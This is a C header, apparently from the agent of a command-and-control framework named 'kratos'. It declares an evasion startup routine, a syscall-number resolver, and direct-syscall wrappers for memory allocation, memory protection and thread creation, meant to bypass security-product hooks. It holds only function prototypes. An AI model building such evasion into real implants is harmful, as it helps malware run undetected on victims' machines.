#pragma once
#include <windows.h>

/* Called once at agent startup. Each technique is compiled only if its
 * own define is present. The function itself is always generated.     */
void kratos_evasion_init(void);

/* ---- Direct syscall API (only available when EVASION_SYSCALLS) ---- */
#ifdef EVASION_SYSCALLS
#include <ntstatus.h>

DWORD    kratos_resolve_ssn(const char *func_name);

/* Wrappers around frequently-hooked Nt* functions */
NTSTATUS kratos_NtAllocateVirtualMemory(HANDLE Process, PVOID *BaseAddress,
                                        ULONG_PTR ZeroBits, PSIZE_T RegionSize,
                                        ULONG AllocationType, ULONG Protect);

NTSTATUS kratos_NtProtectVirtualMemory(HANDLE Process, PVOID *BaseAddress,
                                       PSIZE_T RegionSize, ULONG NewProtect,
                                       PULONG OldProtect);

NTSTATUS kratos_NtCreateThreadEx(PHANDLE ThreadHandle, ACCESS_MASK DesiredAccess,
                                 PVOID ObjectAttributes, HANDLE ProcessHandle,
                                 PVOID StartRoutine, PVOID Argument,
                                 ULONG CreateFlags, SIZE_T ZeroBits,
                                 SIZE_T StackSize, SIZE_T MaximumStackSize,
                                 PVOID AttributeList);
#endif /* EVASION_SYSCALLS */
